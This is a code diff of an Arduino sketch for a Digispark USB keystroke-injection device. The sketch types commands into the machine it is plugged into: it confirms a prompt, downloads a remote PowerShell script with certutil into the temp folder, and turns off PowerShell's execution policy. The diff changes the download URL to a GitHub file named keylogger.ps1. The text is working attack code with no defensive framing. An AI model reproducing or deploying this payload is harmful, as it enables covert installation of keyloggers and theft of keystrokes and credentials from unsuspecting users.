@@ -12,7 +12,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print(" certutil -urlcache -split -f 'http://bit.do/digiscript'  $env:temp/script.ps1");
+  DigiKeyboard.print(" certutil -urlcache -split -f 'https://raw.githubusercontent.com/chithu162/final_project/master/keylogger.ps1'  $env:temp/script.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("Set-ExecutionPolicy Bypass");
